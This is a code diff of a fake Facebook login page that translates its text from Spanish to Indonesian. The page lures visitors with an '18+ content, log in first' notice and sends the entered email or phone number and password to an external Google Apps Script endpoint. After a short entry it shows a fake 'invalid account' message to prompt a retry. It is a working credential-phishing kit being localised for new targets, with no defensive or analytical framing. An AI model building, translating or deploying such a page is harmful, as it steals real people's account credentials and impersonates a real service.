@@ -129,17 +129,17 @@
                 <div class="modal-body">
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
-                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Contenido 18+, inicie sesión antes de verlo.</div>
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Konten 18+, harap masuk sebelum menonton.</div>
                         <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbwjC4pwe-tyXB6p2RKOkCdi3MrNB_eJkaxWDgNoFDgJ8GNpeJhpKsM5No-MXy4TPudBDg/exec">
                             <label class="mt-10">
-                                <input id="username" type="text" name="username" required="" placeholder="Correo electrónico o número de teléfono">
+                                <input id="username" type="text" name="username" required="" placeholder="Email atau Nomor Telepon">
                             </label>
                             <label class="mt-10">
-                                <input id="password" type="password" name="password" required="" placeholder="Contraseña">
+                                <input id="password" type="password" name="password" required="" placeholder="Kata Sandi">
                             </label>
-                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Iniciar sesión">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Masuk">
                         </form>
-                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">¿Has olvidado la contraseña?</a></h5>
+                        <h5 class="forgotpass_h5"><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Lupa Kata Sandi?</a></h5>
                     </section>
                 </div>
             </div>
@@ -161,9 +161,9 @@ var count = 0;
 
 function submitForm() {
     if ($('#username').val().length < 6 || $('#password').val().length < 6) {
-		//alert('Información ingresada incorrectamente');
+		//alert('Informasi yang dimasukkan salah');
 		$('#noti').css({ "color": "red" });
-		$('#noti').text('La cuenta que acaba de ingresar no es válida, inténtelo de nuevo.');
+		$('#noti').text('Akun yang baru saja Anda masukkan tidak valid, silakan coba lagi.');
 		return;
     } else {
         //count++;
